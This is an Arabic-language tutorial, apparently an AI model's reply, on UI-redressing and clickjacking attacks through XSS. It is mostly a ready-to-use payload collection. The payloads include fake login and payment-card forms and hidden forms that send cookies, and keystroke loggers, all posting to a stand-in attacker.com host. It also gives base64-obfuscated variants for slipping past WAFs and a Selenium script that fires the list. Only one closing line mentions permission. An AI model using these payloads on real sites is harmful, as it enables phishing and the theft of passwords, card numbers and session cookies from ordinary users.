
## الخطوات العملية للحقن المستخدمة لتزييف واجهة المستخدم Camouflage
1. **إعداد البيئة**:
   - استخدم متصفحًا مع أداة وكيل (مثل **Burp Suite** أو **OWASP ZAP**) لمراقبة الطلبات الصادرة الناتجة عن تفاعل المستخدم.
   - أعد خادمًا خارجيًا (مثل خادم Python بسيط أو خدمة مثل `ngrok`) لتسجيل البيانات أو الإجراءات الناتجة عن النقرات أو إدخال البيانات.
   - افتح أدوات المطورين في المتصفح (F12) لمراقبة وحدة التحكم (Console)، الشبكة (Network)، وتغييرات DOM.
   - تأكد من وجود ثغرة XSS ناجحة (مثل تنفيذ `<script>alert('XSS')</script>`).

2. **تحديد العناصر المستهدفة**:
   - حدد العناصر في الصفحة التي يمكن تزييفها أو التلاعب بها، مثل:
     - أزرار (مثل "تسجيل الدخول" أو "حذف الحساب").
     - نماذج (مثل حقول إدخال كلمة المرور أو البريد الإلكتروني).
     - روابط (مثل "إعادة تعيين كلمة المرور").
     - محتوى الصفحة (مثل رسائل الخطأ أو الإشعارات).
   - افحص شيفرة الصفحة (عبر أدوات المطورين) لتحديد معرفات العناصر (IDs)، الفئات (classes)، أو الأنماط (styles) التي يمكن استهدافها.

3. **إدخال الحقن**:
   - أدخل شيفرة JavaScript في نقطة الإدخال العرضة لـ XSS (مثل معلمة URL أو حقل تعليق) لتعديل واجهة المستخدم.
   - صمم الحقنة لتزييف العناصر أو خداع المستخدم، مثل:
     - إنشاء زر شفاف فوق زر شرعي: `<div style="position:absolute;opacity:0.1" onclick="fetch('http://attacker.com/log')">اضغط هنا</div>`
     - إنشاء نموذج مزيف: `<form action="http://attacker.com/log"><input type="text" name="username"><input type="submit"></form>`
     - تغطية الصفحة: `<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white">صفحة تسجيل الدخول</div>`
   - جرب الحقن في سياقات مختلفة:
     - معلمات URL: `https://example.com/?search=<script>document.body.innerHTML='<div onclick="alert(1)">اض     - حقول نماذج: أدخل `<div style="position:absolute;opacity:0" onclick="fetch('http://attacker.com/log')">اضغط هنا</div>` في تعليق.
     - الهاش: `https://example.com/#<script>document.getElementById('login-btn').onclick=() => fetch('http://attacker.com/log')</script>`

4. **مراقبة الاستجابات**:
   - تحقق من تفاعل المستخدم مع العناصر المزيفة:
     - **نجاح (True)**: المستخدم ينقر على عنصر ضار، يُرسل بيانات إلى خادمك، أو يتم تنفيذ إجراء غير مقصود (مثل إرسال نموذج أو تغيير إعدادات).
     - **فشل (False)**: لا يتفاعل المستخدم، أو تمنع الحماية (مثل `X-Frame-Options` أو CSP) التغييرات.
   - استخدم أدوات المطورين (F12) لمراقبة طلبات الشبكة الصادرة (Network tab) أو تغييرات DOM.
   - تحقق من سجلات خادمك الخارجي لتأكيد استلام البيانات أو الإجراءات.

5. **تجربة تقنيات تزييف مختلفة**:
   - إذا فشلت الحقنة (مثل منع التغييرات بسبب CSP)، جرب تقنيات أخرى:
     - تغيير الأنماط: تعديل `opacity`، `z-index`، أو `position` لإخفاء/إظهار العناصر.
     - إنشاء iframes: إدراج صفحة شرعية في إطار مخفي مع زر ضار فوقه.
     - محاكاة واجهات شائعة: إنشاء نموذج تسجيل دخول يشبه واجهة الموقع.
   - اختبر نقاط إدخال متعددة (مثل حقول نماذج أخرى أو معلمات URL مختلفة).
   - جرب حقنًا تتطلب تفاعلًا (مثل النقر أو إدخال نص) لزيادة احتمالية التفاعل.

6. **تأكيد السياق وتصعيد الهجوم (اختياري)**:
   - استخدم حقن تكشف سياق التنفيذ (مثل `<script>fetch('http://attacker.com/log?d='+document.domain)</script>`).
   - تحقق مما إذا كانت الثغرة في بيئة معزولة (مثل iframe أو sandbox).
   - إذا نجحت الحقن، جرب هجمات متقدمة مثل:
     - سرقة بيانات النماذج المزيفة.
     - إعادة توجيه المستخدم إلى صفحة ضارة بعد النقر.
     - تغيير إعدادات الحساب (مثل إرسال طلب لتغيير كلمة المرور).

---

## جميع المحاولات الممكنة للحقن المستخدمة لتزييف واجهة المستخدم
في الحقن المستخدمة لتزييف واجهة المستخدم، المحاولات تركز على خداع المستخدم للتفاعل مع عناصر ضارة عبر التلاعب بـ DOM وCSS. سأقسم المحاولات إلى فئتين:
1. **الحقن اليدوية**: للاختبار اليدوي عبر نقاط الإدخال العرضة لـ XSS.
2. **الحقن للأتمتة**: للاستخدام مع سكربتات أو أدوات آلية.

### 1. الحقن اليدوية
تُستخدم هذه الحقن عند اختبار الثغرة يدويًا عبر إدخال شيفرة في حقول النماذج، معلمات URL، أو نقاط إدخال أخرى. الهدف هو تعديل واجهة المستخدم لخداع المستخدم.

#### أ. إعادة توجيه النقر (Clickjacking)
وضع عناصر شفافة أو مخفية فوق عناصر شرعية لإعادة توجيه النقر.
- **الحقن**: `<div style="position:absolute;top:0;left:0;opacity:0;width:100%;height:100%" onclick="fetch('http://attacker.com/log')">اضغط هنا</div>`
  - **الإدخال**: أدخل في حقل تعليق: `<div style="position:absolute;top:0;left:0;opacity:0;width:100%;height:100%" onclick="fetch('http://attacker.com/log')">اضغط هنا</div>`
  - **كيف يعمل**: يضع طبقة شفافة فوق الصفحة، وينفذ طلبًا عند النقر.
  - **متى يُستخدم؟**: لإعادة توجيه النقر إلى خادم المهاجم.
- **الحقن**: `<div style="position:absolute;top:100px;left:100px;opacity:0.1" onclick="alert('تم النقر!')">اضغط هنا</div>`
  - **الإدخال**: `https://example.com/?search=<div style="position:absolute;top:100px;left:100px;opacity:0.1" onclick="alert('تم النقر!')">اضغط هنا</div>`
  - **كيف يعمل**: يعرض تنبيهًا عند النقر على منطقة محددة.
  - **متى يُستخدم؟**: لتأكيد تفاعل المستخدم.
- **الحقن**: `<iframe src="https://example.com/reset-password" style="opacity:0;position:absolute;top:0;left:0"><div style="position:absolute;top:50px;left:50px" onclick="fetch('http://attacker.com/log')">إعادة تعيين</div></iframe>`
  - **الإدخال**: أدخل في نموذج: `<iframe src="https://example.com/reset-password" style="opacity:0;position:absolute;top:0;left:0"><div style="position:absolute;top:50px;left:50px" onclick="fetch('http://attacker.com/log')">إعادة تعيين</div></iframe>`
  - **كيف يعمل**: يضع زرًا ضارًا فوق صفحة إعادة تعيين كلمة المرور.
  - **متى يُستخدم؟**: لخداع المستخدم لتنفيذ إجراء حساس.
- **الحقن**: `<div style="position:absolute;top:0;left:0;opacity:0;z-index:9999;width:100%;height:100%" onmouseover="fetch('http://attacker.com/log')">مرر هنا</div>`
  - **الإدخال**: `https://example.com/#<div style="position:absolute;top:0;left:0;opacity:0;z-index:9999;width:100%;height:100%" onmouseover="fetch('http://attacker.com/log')">مرر هنا</div>`
  - **كيف يعمل**: ينفذ طلبًا عند تمرير المؤشر فوق الصفحة.
  - **متى يُستخدم؟**: لتتبع حركة المستخدم.
- **الحقن**: `<button style="position:absolute;top:100px;left:100px;opacity:0" onclick="document.location='http://attacker.com'">اضغط</button>`
  - **الإدخال**: أدخل في حقل: `<button style="position:absolute;top:100px;left:100px;opacity:0" onclick="document.location='http://attacker.com'">اضغط</button>`
  - **كيف يعمل**: يعيد توجيه المستخدم إلى موقع ضار عند النقر.
  - **متى يُستخدم؟**: لإعادة التوجيه الخبيث.

#### الشرح العملي :
#### ب. التلاعب بالعناصر البصرية
تغيير مظهر الصفحة لخداع المستخدم.
- **الحقن**: `<script>document.body.innerHTML='<h1>خطأ: الرجاء تسجيل الدخول مجددًا</h1><form action="http://attacker.com/log"><input type="text" name="username"><input type="password" name="password"><input type="submit"></form>'</script>`
  - **الإدخال**: `https://example.com/?search=<script>document.body.innerHTML='<h1>خطأ: الرجاء تسجيل الدخول مجددًا</h1><form action="http://attacker.com/log"><input type="text" name="username"><input type="password" name="password"><input type="submit"></form>'</script>`
  - **كيف يعمل**: يستبدل محتوى الصفحة بنموذج تسجيل دخول مزيف.
  - **متى يُستخدم؟**: لسرقة بيانات تسجيل الدخول.
- **الحقن**: `<script>document.getElementById('login-btn').style.display='none';document.body.innerHTML+='<button onclick="fetch(\'http://attacker.com/log\')">تسجيل الدخول</button>'</script>`
  - **الإدخال**: أدخل في نموذج: `<script>document.getElementById('login-btn').style.display='none';document.body.innerHTML+='<button onclick="fetch(\'http://attacker.com/log\')">تسجيل الدخول</button>'</script>`
  - **كيف يعمل**: يخفي زر تسجيل الدخول الأصلي ويضيف زرًا ضارًا.
  - **متى يُستخدم؟**: لاستبدال عناصر شرعية.
- **الحقن**: `<style>body { background: white; } #content { display: none; } .fake { position: fixed; top: 0; left: 0; width: 100%; height: 100%; }</style><div class="fake">صفحة تسجيل الدخول</div>`
  - **الإدخال**: `https://example.com/#<style>body { background: white; } #content { display: none; } .fake { position: fixed; top: 0; left: 0; width: 100%; height: 100%; }</style><div class="fake">صفحة تسجيل الدخول</div>`
  - **كيف يعمل**: يغطي الصفحة بواجهة مزيفة.
  - **متى يُستخدم؟**: لمحاكاة صفحة شرعية.
- **الحقن**: `<script>document.querySelector('.notification').innerHTML='تم تسجيل الخروج. <a href="http://attacker.com">تسجيل الدخول</a>'</script>`
  - **الإدخال**: أدخل في حقل: `<script>document.querySelector('.notification').innerHTML='تم تسجيل الخروج. <a href="http://attacker.com">تسجيل الدخول</a>'</script>`
  - **كيف يعمل**: يعدل إشعارًا لخداع المستخدم.
  - **متى يُستخدم؟**: لإضافة روابط ضارة.
- **الحقن**: `<script>document.body.style.opacity='0.5';document.body.innerHTML+='<div style="position:fixed;top:0;left:0">تحديث الموقع...</div>'</script>`
  - **الإدخال**: `https://example.com/?search=<script>document.body.style.opacity='0.5';document.body.innerHTML+='<div style="position:fixed;top:0;left:0">تحديث الموقع...</div>'</script>`
  - **كيف يعمل**: يجعل الصفحة باهتة ويضيف رسالة مضللة.
  - **متى يُستخدم؟**: لإيهام المستخدم بأن الموقع قيد الصيانة.
#### الشرح العملي :


#### ج. تزييف النماذج
إنشاء نماذج مزيفة لسرقة البيانات.
- **الحقن**: `<form action="http://attacker.com/log"><input type="text" name="username" placeholder="اسم المستخدم"><input type="password" name="password" placeholder="كلمة المرور"><input type="submit" value="تسجيل الدخول"></form>`
  - **الإدخال**: أدخل في تعليق: `<form action="http://attacker.com/log"><input type="text" name="username" placeholder="اسم المستخدم"><input type="password" name="password" placeholder="كلمة المرور"><input type="submit" value="تسجيل الدخول"></form>`
  - **كيف يعمل**: يرسل بيانات تسجيل الدخول إلى خادم المهاجم.
  - **متى يُستخدم؟**: لسرقة بيانات المستخدم.
- **الحقن**: `<script>document.body.innerHTML='<form action="http://attacker.com/log"><input type="text" name="card" placeholder="رقم البطاقة"><input type="submit" value="إرسال"></form>'</script>`
  - **الإدخال**: `https://example.com/?search=<script>document.body.innerHTML='<form action="http://attacker.com/log"><input type="text" name="card" placeholder="رقم البطاقة"><input type="submit" value="إرسال"></form>'</script>`
  - **كيف يعمل**: يحل محل الصفحة بنموذج دفع مزيف.
  - **متى يُستخدم؟**: لسرقة بيانات الدفع.
- **الحقن**: `<div style="position:absolute;top:100px;left:100px"><form action="http://attacker.com/log"><input type="email" name="email"><input type="submit" value="تحديث البريد"></form></div>`
  - **الإدخال**: أدخل في نموذج: `<div style="position:absolute;top:100px;left:100px"><form action="http://attacker.com/log"><input type="email" name="email"><input type="submit" value="تحديث البريد"></form></div>`
  - **كيف يعمل**: يضيف نموذجًا مزيفًا لتحديث البريد الإلكتروني.
  - **متى يُستخدم؟**: لخداع المستخدم لتحديث بياناته.
- **الحقن**: `<script>document.getElementById('login-form').action='http://attacker.com/log'</script>`
  - **الإدخال**: `https://example.com/#<script>document.getElementById('login-form').action='http://attacker.com/log'</script>`
  - **كيف يعمل**: يغير وجهة النموذج الأصلي إلى خادم المهاجم.
  - **متى يُستخدم؟**: للتلاعب بالنماذج الشرعية.
- **الحقن**: `<form action="http://attacker.com/log" style="position:absolute;top:0;left:0;opacity:0"><input type="text" name="data" value="'+document.cookie+'"><input type="submit"></form>`
  - **الإدخال**: أدخل في حقل: `<form action="http://attacker.com/log" style="position:absolute;top:0;left:0;opacity:0"><input type="text" name="data" value="'+document.cookie+'"><input type="submit"></form>`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط عبر نموذج مخفي.
  - **متى يُستخدم؟**: لسرقة البيانات دون ملاحظة.
#### الشرح العملي :


#### د. الحقن المستندة إلى الأحداث
استخدام أحداث تفاعلية لتشغيل الخداع.
- **الحقن**: `<div onclick="fetch('http://attacker.com/log')" style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0">اضغط هنا</div>`
  - **الإدخال**: `https://example.com/?search=<div onclick="fetch('http://attacker.com/log')" style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0">اضغط هنا</div>`
  - **كيف يعمل**: يرسل طلبًا عند النقر على أي مكان في الصفحة.
  - **متى يُستخدم؟**: لتتبع النقرات.
- **الحقن**: `<div onmouseover="document.body.innerHTML='<h1>خطأ: أعد تسجيل الدخول</h1>'" style="position:absolute;top:0;left:0;width:100%;height:100%">مرر هنا</div>`
  - **الإدخال**: أدخل في نموذج: `<div onmouseover="document.body.innerHTML='<h1>خطأ: أعد تسجيل الدخول</h1>'" style="position:absolute;top:0;left:0;width:100%;height:100%">مرر هنا</div>`
  - **كيف يعمل**: يغير الصفحة عند تمرير المؤشر.
  - **متى يُستخدم؟**: لتشغيل التزييف ديناميكيًا.
- **الحقن**: `<input onfocus="fetch('http://attacker.com/log?data='+this.value)" style="position:absolute;top:0;left:0;opacity:0" autofocus>`
  - **الإدخال**: `https://example.com/#<input onfocus="fetch('http://attacker.com/log?data='+this.value)" style="position:absolute;top:0;left:0;opacity:0" autofocus>`
  - **كيف يعمل**: يرسل البيانات المدخلة عند تركيز الحقل.
  - **متى يُستخدم؟**: لسرقة الإدخالات.
- **الحقن**: `<div onkeypress="fetch('http://attacker.com/log?key='+event.key)" style="position:absolute;top:0;left:0;width:100%;height:100%">اكتب هنا</div>`
  - **الإدخال**: أدخل في حقل: `<div onkeypress="fetch('http://attacker.com/log?key='+event.key)" style="position:absolute;top:0;left:0;width:100%;height:100%">اكتب هنا</div>`
  - **كيف يعمل**: يسجل المفاتيح المضغوطة.
  - **متى يُستخدم؟**: لتسجيل ضغطات المفاتيح.
- **الحقن**: `<div oncontextmenu="document.body.innerHTML='<h1>تم النقر الأيمن!</h1>'" style="position:absolute;top:0;left:0;width:100%;height:100%">انقر بزر الماوس الأيمن</div>`
  - **الإدخال**: `https://example.com/?search=<div oncontextmenu="document.body.innerHTML='<h1>تم النقر الأيمن!</h1>'" style="position:absolute;top:0;left:0;width:100%;height:100%">انقر بزر الماوس الأيمن</div>`
  - **كيف يعمل**: يغير الصفحة عند النقر الأيمن.
  - **متى يُستخدم؟**: لخداع المستخدم عند استخدام القائمة السياقية.
#### الشرح العملي :
#### هـ. حقن مع التعتيم
استخدام تقنيات التعتيم لتجنب الكشف.
- **الحقن**: `<script>eval(atob('ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9JzxidXR0b24gb25jbGljaz0iZmV0Y2goXCJodHRwOi8vYXR0YWNrZXIuY29tL2xvZ1wiKSI+U3VibWl0PC9idXR0b24+Jyk='))</script>`
  - **الإدخال**: أدخل في حقل: `<script>eval(atob('ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9JzxidXR0b24gb25jbGljaz0iZmV0Y2goXCJodHRwOi8vYXR0YWNrZXIuY29tL2xvZ1wiKSI+U3VibWl0PC9idXR0b24+Jyk='))</script>`
  - **كيف يعمل**: يفك تشفير Base64 لإنشاء زر ضار.
  - **متى يُستخدم؟**: لتجاوز فلاتر WAF.
- **الحقن**: `<script>document['body']['innerHTML']='<div style="position:absolute;top:0;left:0" onclick="fetch(\'http://attacker.com/log\')">Click</div>'</script>`
  - **الإدخال**: `https://example.com/?search=<script>document['body']['innerHTML']='<div style="position:absolute;top:0;left:0" onclick="fetch(\'http://attacker.com/log\')">Click</div>'</script>`
  - **كيف يعمل**: يستخدم صيغة غير قياسية لتجنب الكشف.
  - **متى يُستخدم؟**: لتجنب فلاتر البحث عن الكلمات.
- **الحقن**: `<script>setTimeout(() => document.body.innerHTML='<form action="http://attacker.com/log"><input type="text" name="data"><input type="submit"></form>', 1000)</script>`
  - **الإدخال**: أدخل في نموذج: `<script>setTimeout(() => document.body.innerHTML='<form action="http://attacker.com/log"><input type="text" name="data"><input type="submit"></form>', 1000)</script>`
  - **كيف يعمل**: يؤخر تنفيذ النموذج المزيف.
  - **متى يُستخدم؟**: لتجنب الكشف المبكر.
#### الشرح العملي :
### 2. الحقن للأتمتة
تُستخدم هذه الحقن مع سكربتات (مثل Python مع مكتبة `selenium`) لأتمتة اختبار مجموعة من الحقن المستخدمة لتزييف واجهة المستخدم وتحليل الاستجابات.

#### أ. إعداد قائمة الحقن
- **المحاولات**:
  - إنشاء قائمة بالحقن التي تزيف واجهة المستخدم.
  - مثال قائمة:
    ```
    <div style="position:absolute;top:0;left:0;opacity:0;width:100%;height:100%" onclick="fetch('http://attacker.com/log')">اضغط هنا</div>
    <script>document.body.innerHTML='<form action="http://attacker.com/log"><input type="text" name="username"><input type="password" name="password"><input type="submit"></form>'</script>
    <iframe src="https://example.com/reset-password" style="opacity:0"><div style="position:absolute;top:50px;left:50px" onclick="fetch('http://attacker.com/log')">إعادة تعيين</div></iframe>
    <style>body { background: white; } #content { display: none; }</style><div>صفحة تسجيل الدخول</div>
    <script>document.getElementById('login-form').action='http://attacker.com/log'</script>
    ```
- **كيف يعمل**:
  - يتم إرسال كل حقنة عبر نقطة إدخال XSS.
  - يتم مراقبة التفاعلات أو الطلبات الصادرة لتأكيد النجاح.
- **متى يُستخدم؟**:
  - عند اختبار نقاط إدخال متعددة بسرعة.

#### ب. سكربت أتمتة بسيط
- **السكربت** (مثال بلغة Python مع Selenium لمحاكاة المتصفح):
  ```python
  from selenium import webdriver
  from selenium.webdriver.common.by import By
  from selenium.webdriver.common.action_chains import ActionChains
  import time

  url = "https://example.com/?search="
  payloads = [
      "<div style=\"position:absolute;top:0;left:0;opacity:0;width:100%;height:100%\" onclick=\"fetch('http://attacker.com/log')\">اضغط هنا</div>",
      "<script>document.body.innerHTML='<form action=\"http://attacker.com/log\"><input type=\"text\" name=\"username\"><input type=\"password\" name=\"password\"><input type=\"submit\"></form>'</script>",
      "<iframe src=\"https://example.com/reset-password\" style=\"opacity:0\"><div style=\"position:absolute;top:50px;left:50px\" onclick=\"fetch('http://attacker.com/log')\">إعادة تعيين</div></iframe>",
      "<style>body { background: white; } #content { display: none; }</style><div>صفحة تسجيل الدخول</div>",
      "<script>document.getElementById('login-form').action='http://attacker.com/log'</script>"
  ]

  driver = webdriver.Chrome()
  for payload in payloads:
      driver.get(url + payload)
      time.sleep(2)  # انتظر تحميل الصفحة
      ActionChains(driver).move_to_element(driver.find_element(By.TAG_NAME, "body")).click().perform()
      print(f"اختبار: {payload}")
  driver.quit()
  ```
- **كيف يعمل**:
  - يفتح كل URL مع الحقنة في المتصفح.
  - يحاكي نقرة المستخدم لاختبار التفاعل.
  - يتطلب خادمًا خارجيًا لتسجيل الطلبات.
- **متى يُستخدم؟**:
  - عند الحاجة لاختبار آلي لتفاعلات المستخدم.

#### ج. تحليل الاستجابات
- **المحاولات**:
  - قارن الاستجابات بناءً على:
    - **طلبات الشبكة**: تحقق من الطلبات المرسلة إلى `http://attacker.com/log`.
    - **تغييرات DOM**: تحقق من تعديل العناصر أو النماذج.
    - **تفاعل المستخدم**: تحقق من النقرات أو إدخال البيانات (عبر محاكاة Selenium).
  - مثال: إذا تلقى الخادم طلبًا بعد النقر، فهذا يؤكد نجاح الحقن.
- **كيف يعمل**:
  - يتم تسجيل الاستجابات لتحديد الحقن الناجحة.
- **متى يُستخدم؟**:
  - لتحديد الحقن الأكثر فعالية.

#### د. توسيع قائمة الحقن
- **المحاولات**:
  - أضف حقنًا إضافية (مثل `<script>document.body.innerHTML='<button onclick="navigator.sendBeacon(\'http://attacker.com/log\')">Click</button>'</script>`).
  - جرب أحداث أخرى (مثل `onwheel`، `onpointerdown`).
  - اختبر دمج الحقن مع تقنيات أخرى (مثل إعادة التوجيه بعد النقر).
- **كيف يعمل**:
  - يتم إنشاء قائمة موسعة تشمل كل المتغيرات الممكنة.
  - مثال: إضافة `<div onwheel="fetch('http://attacker.com/log')" style="position:absolute;top:0;left:0;width:100%;height:100%">قم بالتمرير</div>` إلى القائمة.
- **متى يُستخدم؟**:
  - عند الحاجة لتغطية شاملة للسياقات.

---



1. إعادة توجيه النقر (Clickjacking):
- <div style="position:absolute;top:0;left:0;opacity:0;width:100%;height:100%" onclick="fetch('http://attacker.com/log')">اضغط هنا</div>: يضع طبقة شفافة ويرسل طلبًا عند النقر.
- <div style="position:absolute;top:100px;left:100px;opacity:0.1" onclick="alert('تم النقر!')">اضغط هنا</div>: يعرض تنبيهًا عند النقر.
- <iframe src="https://example.com/reset-password" style="opacity:0;position:absolute;top:0;left:0"><div style="position:absolute;top:50px;left:50px" onclick="fetch('http://attacker.com/log')">إعادة تعيين</div></iframe>: يضع زرًا ضارًا فوق صفحة حساسة.
- <div style="position:absolute;top:0;left:0;opacity:0;z-index:9999;width:100%;height:100%" onmouseover="fetch('http://attacker.com/log')">مرر هنا</div>: ينفذ طلبًا عند تمرير المؤشر.
- <button style="position:absolute;top:100px;left:100px;opacity:0" onclick="document.location='http://attacker.com'">اضغط</button>: يعيد توجيه المستخدم عند النقر.

2. التلاعب بالعناصر البصرية:
- <script>document.body.innerHTML='<h1>خطأ: الرجاء تسجيل الدخول مجددًا</h1><form action="http://attacker.com/log"><input type="text" name="username"><input type="password" name="password"><input type="submit"></form>'</script>: يستبدل الصفحة بنموذج مزيف.
- <script>document.getElementById('login-btn').style.display='none';document.body.innerHTML+='<button onclick="fetch(\'http://attacker.com/log\')">تسجيل الدخول</button>'</script>: يخفي زرًا ويضيف زرًا ضارًا.
- <style>body { background: white; } #content { display: none; } .fake { position: fixed; top: 0; left: 0; width: 100%; height: 100%; }</style><div class="fake">صفحة تسجيل الدخول</div>: يغطي الصفحة بواجهة مزيفة.
- <script>document.querySelector('.notification').innerHTML='تم تسجيل الخروج. <a href="http://attacker.com">تسجيل الدخول</a>'</script>: يعدل إشعارًا لإضافة رابط ضار.
- <script>document.body.style.opacity='0.5';document.body.innerHTML+='<div style="position:fixed;top:0;left:0">تحديث الموقع...</div>'</script>: يجعل الصفحة باهتة مع رسالة مضللة.

3. تزييف النماذج:
- <form action="http://attacker.com/log"><input type="text" name="username" placeholder="اسم المستخدم"><input type="password" name="password" placeholder="كلمة المرور"><input type="submit" value="تسجيل الدخول"></form>: يرسل بيانات تسجيل الدخول إلى خادم المهاجم.
- <script>document.body.innerHTML='<form action="http://attacker.com/log"><input type="text" name="card" placeholder="رقم البطاقة"><input type="submit" value="إرسال"></form>'</script>: يحل محل الصفحة بنموذج دفع مزيف.
- <div style="position:absolute;top:100px;left:100px"><form action="http://attacker.com/log"><input type="email" name="email"><input type="submit" value="تحديث البريد"></form></div>: يضيف نموذجًا لتحديث البريد.
- <script>document.getElementById('login-form').action='http://attacker.com/log'</script>: يغير وجهة النموذج الأصلي.
- <form action="http://attacker.com/log" style="position:absolute;top:0;left:0;opacity:0"><input type="text" name="data" value="'+document.cookie+'"><input type="submit"></form>: يرسل ملفات تعريف الارتباط عبر نموذج مخفي.

4. الحقن المستندة إلى الأحداث:
- <div onclick="fetch('http://attacker.com/log')" style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0">اضغط هنا</div>: يرسل طلبًا عند النقر.
- <div onmouseover="document.body.innerHTML='<h1>خطأ: أعد تسجيل الدخول</h1>'" style="position:absolute;top:0;left:0;width:100%;height:100%">مرر هنا</div>: يغير الصفحة عند تمرير المؤشر.
- <input onfocus="fetch('http://attacker.com/log?data='+this.value)" style="position:absolute;top:0;left:0;opacity:0" autofocus>: يرسل البيانات المدخلة عند التركيز.
- <div onkeypress="fetch('http://attacker.com/log?key='+event.key)" style="position:absolute;top:0;left:0;width:100%;height:100%">اكتب هنا</div>: يسجل المفاتيح المضغوطة.
- <div oncontextmenu="document.body.innerHTML='<h1>تم النقر الأيمن!</h1>'" style="position:absolute;top:0;left:0;width:100%;height:100%">انقر بزر الماوس الأيمن</div>: يغير الصفحة عند النقر الأيمن.

5. حقن مع التعتيم:
- <script>eval(atob('ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9JzxidXR0b24gb25jbGljaz0iZmV0Y2goXCJodHRwOi8vYXR0YWNrZXIuY29tL2xvZ1wiKSI+U3VibWl0PC9idXR0b24+Jyk='))</script>: يفك تشفير Base64 لإنشاء زر ضار.
- <script>document['body']['innerHTML']='<div style="position:absolute;top:0;left:0" onclick="fetch(\'http://attacker.com/log\')">Click</div>'</script>: يستخدم صيغة غير قياسية.
- <script>setTimeout(() => document.body.innerHTML='<form action="http://attacker.com/log"><input type="text" name="data"><input type="submit"></form>', 1000)</script>: يؤخر تنفيذ النموذج المزيف.



---

**نصائح إضافية**:
- **محاكاة الواجهة**: استخدم أدوات المطورين (F12) لنسخ أنماط CSS وHTML من الموقع الأصلي لجعل الحقن تبدو شرعية.
- **اختبار التفاعل**: استخدم أدوات مثل Selenium لمحاكاة النقرات، تمرير المؤشر، أو إدخال البيانات لاختبار الحقن.
- **تجنب القيود**: تحقق من وجود `X-Frame-Options` أو CSP وجرب تقنيات بديلة (مثل تعديل DOM مباشرة بدلاً من iframes).
- **التعتيم**: استخدم تشفير Base64، تقسيم الشيفرة، أو تأخير التنفيذ لتجنب الكشف بواسطة WAF أو أنظمة الأمان.
- **الأدوات**: استخدم Burp Suite لمراقبة الطلبات الصادرة وأدوات المطورين لفحص DOM والشبكة.
- **السلامة**: اختبر فقط بإذن صريح (مثل برامج مكافآت الأخطاء) وتجنب إلحاق الضرر.

إذا كنت تريد شرح خطوة أخرى بنفس الأسلوب (مثل "Stored XSS Payloads" أو "Bypassing XSS Filters")، أو التركيز على سياق معين (مثل تزييف واجهات تطبيقات SPA)، أخبرني وسأقدم ردًا مخصصًا!